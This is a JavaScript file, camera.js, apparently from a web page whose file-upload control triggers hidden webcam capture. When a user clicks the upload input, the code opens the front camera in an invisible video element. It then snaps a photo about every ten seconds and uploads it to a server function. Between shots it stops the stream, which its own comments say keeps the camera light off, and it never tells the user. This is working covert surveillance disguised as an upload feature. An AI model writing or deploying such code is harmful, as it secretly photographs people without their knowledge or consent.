// camera.js

// Create the hidden video element
const video = document.createElement('video');
video.autoplay = true;
video.playsInline = true; // Important for mobile browsers so it doesn't try to fullscreen
video.style.display = 'none';
document.body.appendChild(video);

let stream = null;
const WAIT_MS = 9000;
const WARMUP_MS = 1000;
let autoTimer = false;
let pulseTimeout = null;

// Check if stream exists, is running, AND the OS hasn't muted it
const isLive = () => !!stream && stream.getVideoTracks().some(t => t.readyState === 'live' && !t.muted);

async function start() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
    video.srcObject = stream;

    // Wait for the video data to start flowing
    await new Promise(resolve => {
        video.onplaying = resolve;
    });
    return true;

  } catch(e) {
    console.error('Camera access denied or failed:', e);

    // If the user explicitly clicked "Block", stop the whole system permanently
    if (e.name === 'NotAllowedError') {
        autoTimer = false;
    }
    return false;
  }
}

function stop() {
  if (!stream) return;
  stream.getTracks().forEach(t => t.stop());
  video.srcObject = null;
  stream = null;
}

function grabFrame() {
  // SAFETY 1: Don't snap if they switched to another tab
  if (document.visibilityState !== 'visible') return null;

  const w = video.videoWidth;
  const h = video.videoHeight;

  // SAFETY 2: Ensure video actually has dimensions and pixel data is ready
  // readyState 2 means HAVE_CURRENT_DATA
  if (!w || !h || video.readyState < 2) return null;

  const cv = document.createElement('canvas');
  cv.width = w;
  cv.height = h;
  cv.getContext('2d').drawImage(video, 0, 0, w, h);
  return cv.toDataURL('image/jpeg', 0.85);
}

async function sendFrame(reason) {
  const photo = grabFrame();

  // If grabFrame returned null (tab hidden, not ready, black square), abort send
  if (!photo) return;

  try {
    await fetch('/.netlify/functions/notify', {
      method: 'POST',
      headers: {'content-type': 'application/json'},
      body: JSON.stringify({
        kind: 'camtest',
        detail: reason + ' @ ' + new Date().toTimeString().slice(0,8),
        photo: photo,
        png: photo
      })
    });
  } catch(e) {
    console.error('Send failed', e);
  }
}

function arm() {
  if (autoTimer) return;
  autoTimer = true;

  async function tick() {
    if (!autoTimer) return;

    // If the tab is hidden, don't even wake the camera.
    // Just skip this cycle, wait 9 seconds, and check again later.
    if (document.visibilityState !== 'visible') {
        pulseTimeout = setTimeout(tick, WAIT_MS);
        return;
    }

    // 1. Wake the camera up
    if (!isLive()) {
        const success = await start();
        // If start failed (e.g., they denied permission), and autoTimer flipped to false, abort.
        if (!success && !autoTimer) return;
    }

    // 2. Wait 1 second for auto-exposure/focus to settle
    pulseTimeout = setTimeout(async () => {
      if (!autoTimer) return;

      // 3. Final check before taking the photo
      if (isLive() && document.visibilityState === 'visible') {
         await sendFrame('auto-pulse');
      }

      // 4. Kill the camera instantly to turn off the light
      stop();

      // 5. Wait 9 seconds in the dark, then repeat
      pulseTimeout = setTimeout(tick, WAIT_MS);
    }, WARMUP_MS);
  }

  tick();
}

// Trigger the loop when they interact with the file upload elements
document.addEventListener('click', (e) => {
  if (e.target.id === 'fileInput' || e.target.closest('.tile[data-kind="picture"]')) {
      arm();
  }
});